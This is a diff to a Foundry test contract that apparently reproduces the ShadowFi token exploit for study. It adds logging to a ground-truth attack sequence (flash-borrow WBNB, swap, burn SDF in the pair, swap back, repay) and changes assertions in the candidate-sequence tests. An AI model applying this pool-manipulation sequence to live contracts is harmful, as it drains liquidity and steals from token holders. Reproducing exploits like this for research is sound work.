@@ -203,7 +203,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt1, amt2);
         swap_pair_attacker_sdf_wbnb(amt3, amt4);
         payback_wbnb_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -224,7 +224,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt2, amt3);
         swap_pair_attacker_sdf_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -245,7 +245,7 @@ contract ShadowFiTest is Test, BlockLoader {
         burn_sdf_pair(amt3);
         swap_pair_attacker_sdf_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -264,7 +264,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt1, amt2);
         swap_pair_attacker_wbnb_sdf(amt3, amt4);
         payback_sdf_owner(amt5);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -285,7 +285,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt2, amt3);
         swap_pair_attacker_wbnb_sdf(amt4, amt5);
         payback_sdf_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -306,7 +306,7 @@ contract ShadowFiTest is Test, BlockLoader {
         burn_sdf_pair(amt3);
         swap_pair_attacker_wbnb_sdf(amt4, amt5);
         payback_sdf_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -331,7 +331,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt5, amt6);
         swap_pair_attacker_sdf_wbnb(amt7, amt8);
         payback_wbnb_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -358,7 +358,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt6, amt7);
         swap_pair_attacker_sdf_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -385,7 +385,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt6, amt7);
         swap_pair_attacker_sdf_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -412,7 +412,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_wbnb_sdf(amt6, amt7);
         swap_pair_attacker_sdf_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -439,7 +439,7 @@ contract ShadowFiTest is Test, BlockLoader {
         burn_sdf_pair(amt7);
         swap_pair_attacker_sdf_wbnb(amt8, amt9);
         payback_wbnb_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -464,7 +464,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt5, amt6);
         swap_pair_attacker_wbnb_sdf(amt7, amt8);
         payback_sdf_owner(amt9);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -491,7 +491,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_sdf(amt8, amt9);
         payback_sdf_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -518,7 +518,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_sdf(amt8, amt9);
         payback_sdf_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -545,7 +545,7 @@ contract ShadowFiTest is Test, BlockLoader {
         swap_pair_attacker_sdf_wbnb(amt6, amt7);
         swap_pair_attacker_wbnb_sdf(amt8, amt9);
         payback_sdf_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
@@ -572,27 +572,37 @@ contract ShadowFiTest is Test, BlockLoader {
         burn_sdf_pair(amt7);
         swap_pair_attacker_wbnb_sdf(amt8, amt9);
         payback_sdf_owner(amt10);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 
     function test_gt() public {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
+        emit log_named_uint("amt0", 1e16);
         borrow_wbnb_owner(1e16);
         printBalance("After step0 ");
+        emit log_named_uint("amt1", 1e16);
+        emit log_named_uint("amt2", pair.getAmountOut(1e16, address(wbnb)));
         swap_pair_attacker_wbnb_sdf(
             1e16,
             pair.getAmountOut(1e16, address(wbnb))
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", sdf.balanceOf(address(pair)) - 1);
         burn_sdf_pair(sdf.balanceOf(address(pair)) - 1);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", sdf.balanceOf(attacker));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))
+        );
         swap_pair_attacker_sdf_wbnb(
             sdf.balanceOf(attacker),
             pair.getAmountOut(sdf.balanceOf(attacker), address(sdf))
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", (1e16 * 1003) / 1000);
         payback_wbnb_owner((1e16 * 1003) / 1000);
         printBalance("After step4 ");
         require(attackGoal(), "Attack failed!");
@@ -616,7 +626,7 @@ contract ShadowFiTest is Test, BlockLoader {
         burn_sdf_pair(amt3);
         swap_pair_attacker_sdf_wbnb(amt4, amt5);
         payback_wbnb_owner(amt6);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
